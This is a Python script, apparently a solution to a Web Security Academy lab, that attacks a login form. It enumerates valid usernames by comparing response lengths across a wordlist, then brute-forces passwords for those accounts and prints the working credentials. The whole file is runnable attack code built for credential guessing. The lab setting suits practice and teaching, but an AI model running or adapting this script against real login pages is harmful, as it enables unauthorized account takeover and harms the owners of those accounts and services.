import requests
import sys

URL_LOGIN = 'https://0a68004e044f29c484896844004d00c4.web-security-academy.net/login'

headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36'
}

payload = {
    'username': '',
    'password': '',
}

usernames = open('./../common_username.txt', 'r', encoding='utf-8').read().strip().split('\n')
passwords = open('./../common_password.txt', 'r', encoding='utf-8').read().strip().split('\n')

session = requests.Session()


# Check validate username
with open('validate_username.txt', 'w', encoding='utf-8') as f:
    res = {}
    count = {}

    f.write('username,length,status_code\n')
    for username in usernames:
        payload['username'] = username
        payload['password'] = '123456789'
        req = session.post(URL_LOGIN, data=payload, headers=headers)
        
        length = len(req.content)
        res[username] = length
        count[length] = count.get(length, 0) + 1

        f.write(f"{username},{len(req.content)},{req.status_code}\n")
        print(username, len(req.content))

    validate_users = []
    for username, length in res.items():
        if count[length] == 1:
            validate_users.append(username)

if not len(validate_users):
    print('Don\'t have username valid in the list')
    sys.exit()

# Check validate password for username found above
with open('validate_password.txt', 'w', encoding='utf-8') as f:
    res = {}
    count = {}
    validate_account = []

    f.write('password,length,status_code\n')
    for valid_username in validate_users:
        for password in passwords:
            payload['username'] = valid_username
            payload['password'] = password
            req = session.post(URL_LOGIN, data=payload, headers=headers)
            
            length = len(req.content)
            count[length] = count.get(length, 0) + 1
            res[password] = length

            f.write(f"{password},{len(req.content)},{req.status_code}\n")
            print(password, len(req.content))

        validate_account = []
        for password, length in res.items():
            if count[length] == 1:
                validate_account.append((valid_username, password))
                break

print("List valid credentials")
print(validate_account)